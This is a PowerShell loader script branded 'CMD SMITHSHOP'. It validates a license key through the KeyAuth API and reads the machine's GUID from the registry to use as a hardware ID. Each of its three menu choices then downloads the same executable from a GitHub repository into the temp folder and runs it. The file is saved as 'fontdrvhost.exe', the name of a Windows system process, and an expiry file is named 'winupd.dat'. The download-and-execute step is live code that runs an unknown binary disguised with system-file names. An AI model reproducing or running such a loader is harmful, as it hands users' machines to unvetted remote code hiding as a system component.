[Console]::OutputEncoding=[Text.Encoding]::UTF8;cls

$u="https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
$p="$env:TEMP\fontdrvhost.exe"
$expf="$env:TEMP\winupd.dat"

function x($k){
    $a="Smithshop all";$b="gw1rzpahob";$c="1.0"
    try{
        $i=irm "https://keyauth.win/api/1.2/" -Method Post -Body @{type="init";name=$a;ownerid=$b;version=$c}
        if(!$i.success){return "e"}
        $s=$i.sessionid
        $h=(gp "HKLM:\SOFTWARE\Microsoft\Cryptography").MachineGuid
        $r=irm "https://keyauth.win/api/1.2/" -Method Post -Body @{type="license";key=$k;name=$a;ownerid=$b;sessionid=$s;hwid=$h}
        if($r.success){"ok"}
        elseif($r.message -like "*hwid*"){"u"}
        else{"f"}
    }catch{"e"}
}

function chk(){
    $e=(Get-Date).AddSeconds(2);$i=0
    while((Get-Date)-lt$e){
        Write-Host "`rchecking key "+("."*($i%6)) -NoNewline
        [console]::beep(500,40)
        sleep -m 80;$i++
    }
    ""
}

function tchk(){
    if(Test-Path $expf){
        $t=[datetime](Get-Content $expf)
        if((Get-Date) -gt $t){
            if(Test-Path $p){Remove-Item $p -Force}
            Write-Host "`nEXPIRED" -ForegroundColor Red
            [console]::beep(300,300)
            sleep 2
            exit
        }
    }
}

function setexp(){
    (Get-Date).AddDays(1) | Out-File $expf -Force
}

# ===== START =====
tchk

Write-Host "=== CMD SMITHSHOP ===" -ForegroundColor Cyan
Write-Host "1. Install"
Write-Host "2. Clean"

$ch=Read-Host ">"

if($ch -eq "1"){

    $k=Read-Host "Enter Key"
    cls

    chk
    $r=x $k

    if($r -eq "ok"){

        if(!(Test-Path $expf)){ setexp }

        [console]::beep(1200,300)
        Write-Host "`nKEY SUCCESS" -ForegroundColor Green

        while($true){

            cls
            Write-Host "=== CMD SMITHSHOP ===" -ForegroundColor Cyan
            Write-Host "1. smithx3d"
            Write-Host "2. uptoking"
            Write-Host "3. kingsmith"
            Write-Host "0. exit"

            $m=Read-Host ">"

            switch($m){
                "1"{$n="smithx3d"}
                "2"{$n="uptoking"}
                "3"{$n="kingsmith"}
                "0"{exit}
                default{continue}
            }

            cls
            Write-Host "install $n..."

            irm $u -OutFile $p
            start $p

            Write-Host "DONE" -ForegroundColor Green
            sleep 2
        }

    }elseif($r -eq "u"){

        [console]::beep(400,300)
        Write-Host "`nDEVICE ALREADY REGISTERED" -ForegroundColor Yellow
        pause

    }else{

        [console]::beep(300,300)
        Write-Host "`nKEY INVALID" -ForegroundColor Red
        pause
    }

}
elseif($ch -eq "2"){

    cls
    Write-Host "cleaning..."

    if(Test-Path $p){
        Remove-Item $p -Force
        Write-Host "DONE" -ForegroundColor Green
    }else{
        Write-Host "NOT FOUND" -ForegroundColor Red
    }
}
